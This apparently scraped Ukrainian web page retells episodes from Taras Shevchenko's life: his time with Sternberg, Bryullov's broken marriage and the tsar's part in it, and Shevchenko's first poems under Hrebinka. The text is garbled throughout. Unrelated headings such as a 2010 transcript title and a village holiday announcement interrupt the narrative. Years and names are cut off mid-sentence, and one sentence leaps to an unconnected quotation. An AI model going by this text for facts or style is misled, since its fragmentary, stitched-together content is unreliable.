<p>
<p>Мешкаючи в одній кімнаті, працювали разом. Штернберґ малював образи із своїх ескізів. Річ ясна, що предметом їх розмов була Україна, звідки прибув Штернберґ, повний свіжих, яскравих для мешканця півночі українських вражень. Коли Сошенко вважав поетичні заняття Шевченка за непотрібні, за марнування дорогого часу, то з романтиком Штернберґом поет міг досхочу ділитися своїми літературними зацікавленнями й читати йому свої поетичні твори.</p>
<p>Брюлов одружився з сестрою їхнього товариша, німця з Риги Тімма — Емілією Тімм. Це була надзвичайна красуня. Шевченко і Штернберґ були в євангелицькій кірсі на шлюбі Брюлова, що відбувся без традиційного весілля. Шевченко був увесь час короткого подружнього життя Брюлових їхнім частим гостем і поділяв захоплення свого вчителя красунею-жінкою. Раптом, менше ніж по двох місяцях, Емілія покинула свого чоловіка й більше вже до нього не вернулася: він завдав їй тяжкої образи.</p>
<p>Драму свою Брюлов переживав дуже тяжко — він захворів, і Шевченко на деякий час навіть переселився до вчителя, опікуючись ним, як умів. Тарас був одною з небагатьох осіб, що були втаємничені в цю історію. У житті Шевченка теж не залишилася вона без значення. Причиною драми Брюлових був цар Микола І — відомо, що він залицявся до гарної дружини славного на всю Росію митця. Немає ніяких даних припускати, що перед тим Шевченко міг щось чути про інтимне життя цього деспота-монарха, але без усяких вагань можна ствердити, що тепер він багато довідався про це від свого вчителя.</p>
<p>Ще восени р. Як що напише, то тільки цмокни та вдар руками об поли!</p><strong><a id='z1'></a><h2>Стенограма 2010</h2></strong><p>А в січні р. Почав Шевченко писати поезії, очевидно, незабаром по тому, як пізнав Гребінку. Гребінці ж першому з своєю творчістю звірився, бо Гребінка перший зайнявся його літературною освітою, і напевне від нього першого Шевченко дістав писані нашою мовою твори і то, мабуть, усі, бо їх тоді було дуже небагато. Російські а може й польські поезії Шевченко вже читав перед тим.</p>
<p>Довідався теж, що його рідні народні пісні, яких він співав завжди залюбки — чи вдома, чи в полі, чи на чужині під час праці, — що ці пісні — теж справжня поезія, поезія, високо цінена також і чужими ученими й поетами, і що не один із них уважає народну пісню за найвищий прояв поетичної творчості, яку поетам треба наслідувати. Велика, мабуть, була його радість, коли деякі з рідних пісень, що їх він сам добре знав, побачив у збірниках кн. Цертелева й Максимовича. Повен тяжких, сумних настроїв, туги за рідним краєм і туги за волею, пригрітий добрими людьми, але й випроваджений ними на манівці оманливих мрій та надій, тужив тоді подвійно, і його наскрізь лірична вдача знайшла вихід для тієї туги: почав сам творити пісні, у яких тугу свою почав виливати.</p>
<p>Виливав її рідним словом. Але туга ця знаходила вислів у формі кращій і ще досконалішій, ніж та, що її мали українські пісні. Обидві знані йому стилістичні форми — народно-пісенна й та літературна, що її взірці знав із російської, польської та з української поезії, у дивно гармонійній сполуці творили нову українську поетичну форму.</p>
<p>За романтичними страхіттями його попередники не спромоглися на таке відтворення психічного стану нещасливої дівчини. У Бюрґера фантастика була представлена, як щось ніби реальне, у Жуковського — як сон, у Шевченка — як візії причинної, божевільної.</p><strong><a id='z2'></a><h2>Білозерка святкує День захисника України! | </h2></strong><p>Описав їх так так само, як і її смерть , ніби був психіатром: це точний опис сомнамбулізму, психічної хвороби, у яку іноді переходять тужливі переживання занадто чутливих натур, — усі симптоми цієї хвороби точно тут відтворені. Глибокий психологізм цієї балади мав джерелом своїм виняткову спостережливість її автора і його просто несамовитий дар — вчуватися в чужу душу. Як саме це сталося, що Гребінці відкрився аже за рік із тим, що пише поезії, — невідомо.</p>
<p>Можливо, що сталося це з приводу смерти І. Схвильований цією сумною вісткою, Шевченко написав елегію. В українських колах у Петербурзі смерть Котляревського, натурально, справила враження, і, можливо, що Шевченко під впливом відповідних розмов відважився прочитати Гребінці цей свій твір, а потім і взагалі відкрився із своєю творчістю, осмілений похвалами земляка-поета.</p>
<p>Ода-елегія на смерть Котляревського вказує нам і на одне з джерел Шевченкового національного усвідомлення. У ній Шевченко ствердив, що це Котляревський.</p>
		
